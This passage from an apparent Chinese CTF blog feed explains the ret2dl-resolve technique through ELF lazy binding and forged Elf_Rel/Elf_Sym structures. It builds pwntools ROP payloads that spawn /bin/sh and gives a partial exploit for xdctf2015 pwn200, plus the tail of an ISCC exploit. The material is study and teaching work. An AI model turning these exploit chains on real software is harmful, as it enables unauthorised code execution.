class="line">p.sendline(p32(read_0)+p32(pppr_addr)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">3</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>)+p32(write_0)+<span class="string">'xxxx'</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>))<span class="comment">#orw操作</span></span><br><span class="line"><span class="comment">#p.sendline()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(p32(elf.symbols['read'])+'aaaa'+p32(0)+p32(0x804a240)+p32(0x100))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2dl-resolve利用方法小记</title>
    <link href="lexsd6.github.io/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/"/>
    <id>lexsd6.github.io/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-05-22T14:34:50.527Z</published>
    <updated>2021-05-23T05:24:58.622Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。<a id="more"></a></p><h2 id="ret2dl-resolve原理与使用条件"><a href="#ret2dl-resolve原理与使用条件" class="headerlink" title="ret2dl-resolve原理与使用条件"></a>ret2dl-resolve原理与使用条件</h2><p>ret2dl-resolve是不需要信息泄露，而是通过动态装载器来直接标识关键函数的位置并调用它们。由于ret2dl-resolve主要是针对延迟绑定来进行操作的，so它可以绕过多种包括专门为保护 ELF 数据结构不被破坏而设计的 RELRO 在内的安全缓解措施。但在依然有条件限制：</p><p>1.需要没有开启 Full RELRO 保护，换句话说要开启延迟绑定的机制，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。（这个是重要条件）</p><p>2.要有能被程序读取数据段上写入Elf_Sym 结构体的空间。</p><p>3.能恶意构造一个Elf_Sym 结构体。</p><h2 id="延迟绑定动态解析过程梳理"><a href="#延迟绑定动态解析过程梳理" class="headerlink" title="延迟绑定动态解析过程梳理"></a>延迟绑定动态解析过程梳理</h2><p>在一个存在延迟绑定机制程序中,库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。</p><p>这过程中牵扯到两个重要的结构体<code>Elf_Rel</code>与<code>Elf_Sym</code>.</p><p>重定位项使用 Elf_Rel 结构体来描述，存在于<code>.rep.plt</code> 段和 <code>.rel.dyn</code>段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword   r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword  r_addend;       <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>32 位程序使用 REL，而 64 位程序使用 RELA。</p><p>其中<code>r_info</code>被宏定义为按如下方式解析和插入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)          ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p>而每个符号使用<code>Elf_Sym</code>结构体来描述，存在于<code>.dynsym</code>段和<code>.symtab</code>段中，而 <code>.symtab</code> 在<code>strip</code>之后会被删掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>下面的宏描述了 st_info 是怎样被解析和插入的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val)      ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><p>当一个库函数被第一次调用时，具体动态解析过程的步骤为：</p><p>导入函数的<code>reloc_index</code>标识(一个<code>ELF_Rel</code>在 <code>.rel.plt</code>中的偏移)入栈。</p><p>然后跳转到<code>.plt</code> 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。</p><p>​    GOT[1]：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的<code>l_info</code> 域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组。</p><p>​    GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</p><p>所以这步，PLT[0] 其实就是调用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p><p><code>_dl_runtime_resolve</code>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code>解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。过程如下图：</p><p><img src="image-20210523114312781.png" alt="image-20210523114312781"></p><h2 id="ret2dl-resolve利用点"><a href="#ret2dl-resolve利用点" class="headerlink" title="ret2dl-resolve利用点"></a>ret2dl-resolve利用点</h2><p>ret2dl-resolve利用点主要有两个地方。</p><p>a：因为动态转载器是从<code>.dynamic</code>段的 <code>DT_STRTAB</code>条目中获得<code>.dynstr</code>段的地址的，而 <code>DT_STRTAB</code>条目的位置已知，默认情况下也可写。所以攻击者能够改写<code>DT_STRTAB</code>条目的内容，欺骗动态装载器，让它以为 <code>.dynstr</code>段在 <code>.bss</code>段中，并在那里伪造一个假的字符串表。当它尝试解析<code>printf</code> 时会使用不同的基地址来寻找函数名，最终执行的是<code>execve</code>。这种方式非常简单，但仅当二进制程序的<strong><code>.dynamic</code>段可写*</strong>时有效。</p><p>b：我们已经知道 <code>_dl_runtime_resolve</code> 的第二个参数是<code>Elf_Rel</code>条目在 <code>.rel.plt</code>段中的偏移，动态装载器将这个值加上<code>.rel.plt</code> 的基址来得到目标结构体的绝对位置。然后当传递给<code>_dl_runtime_resolve</code> 的参数 <code>reloc_index</code>超出了<code>.rel.plt</code> 段，并最终落在<code>.bss</code>段中时，攻击者可以在该位置伪造了一个<code>Elf_Rel</code>结构，并填写<code>r_offset</code>的值为一个可写的内存地址来将解析后的函数地址写在那里，同理<code>r_info</code>也会是一个将动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的 <code>Elf_Sym</code> 结构，而 <code>Elf_Sym</code>结构中的 <code>st_name</code>同样超出了 <code>.dynsym</code>段。这样这个符号就会包含一个相对于<code>.dynstr</code>地址足够大的偏移使其能够达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名称。</p><p><img src="image-20210523115403901.png" alt="image-20210523115403901"></p><h2 id="手动-payload流程构造梳理"><a href="#手动-payload流程构造梳理" class="headerlink" title="手动 payload流程构造梳理"></a>手动 payload流程构造梳理</h2><p>以32位程序来梳理下过程：</p><p>第一步，对于正常函数而言我们调用动态连接的后write函数作payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">"AAAA"</span>     <span class="comment"># new ebp</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(base_addr + <span class="number">80</span>)</span><br><span class="line">payload += p32(len(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload_2))</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">100</span> - len(payload_2))</span><br></pre></td></tr></table></figure><p>第二步，我们伪造<code>write@plt</code>，及入栈<code>reloc_index</code>和跳转PLT[0]，那么payload改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">"/bin/sh"</span></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第三步，伪造一个 write 函数的 <code>Elf_Rel</code>结构体。</p><p>其中设置<code>r_offset</code>为<code>write@got</code>，标函数解析后的内存地址存放到该位置。</p><p><code>r_info</code>用<code>readelf -r ./bof | grep write</code>查找后照搬。动态加载器会根据这个值找到对应的<code>Elf_Sym</code></p><p><code>reloc_index</code>要调整为我们伪造 <code>Elf_Rel</code>结构体相对<code>.rel.plt</code>的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>第四步，伪造一个 write 函数的 <code>Elf_Sym</code>结构体。</p><p>用<code>readelf -s ./bof | grep write</code> 然然后用objdump来找st_name与st_info</p><p><img src="image-20210523130030115.png" alt="image-20210523130030115"></p><p>同时，<code>Elf_Rel</code>结构体也要改变r_info可以通过<code>r_sym</code>和<code>r_type</code>计算。</p><p><code>r_sym</code>又是<code>Elf_Sym</code>相对<code>.dynsym</code>的偏移，<code>r_type</code>照搬<code>R_386_JUMP_SLOT</code>的值为0x7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment">#</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br></pre></td></tr></table></figure><p>第五步，伪造<code>.bss</code> 上伪造<code>.dynstr</code>,放入伪造函数名<code>write</code>。相应调整st_name指向的伪造函数名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_sym=index_dynsym &lt;&lt; <span class="number">8</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info = (r_sym) | r_type</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"write\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br></pre></td></tr></table></figure><p>最后改’write’为system.</p><h2 id="例题：xdctf2015-pwn200"><a href="#例题：xdctf2015-pwn200" class="headerlink" title="例题：xdctf2015_pwn200"></a>例题：xdctf2015_pwn200</h2><p>按之前手动的分析，完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span 